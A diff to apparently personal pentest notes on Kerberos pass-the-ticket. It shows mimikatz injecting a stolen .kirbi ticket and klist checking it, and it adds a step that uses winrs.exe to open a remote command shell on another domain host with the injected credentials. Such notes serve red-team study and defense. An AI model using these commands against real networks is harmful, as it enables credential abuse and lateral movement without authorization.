@@ -28,6 +28,9 @@ Extracting **TGTs** will require us to have **Administrator's Credentials**, and
 
 <br/>
 
+
+### Using the Ticket
+
 ```batch
 :: Injecting the Ticket
 kerberos::ptt [0;e06e9]-0-0-40a50000-delilah.gomez@LDAP-DC.DOMAIN.com.kirbi
@@ -41,6 +44,16 @@ Injecting Tickets in our own Session doesn't require Administrator Privileges. A
 :: Check if the Tickets were Injected Correctly
 klist
 ```
+
+<br/>
+
+Once we have a **Command Prompt** with the Credentials Loaded we can use `winrs` to connect to another **TARGET** on the Domain since the Credentials are **Injected** into our Session.
+
+```batch
+:: The [Username - Password] Fields are not Necessary because the Credentials are already Injected
+winrs.exe -r:TARGET cmd
+```
+
 
 <br/>
 
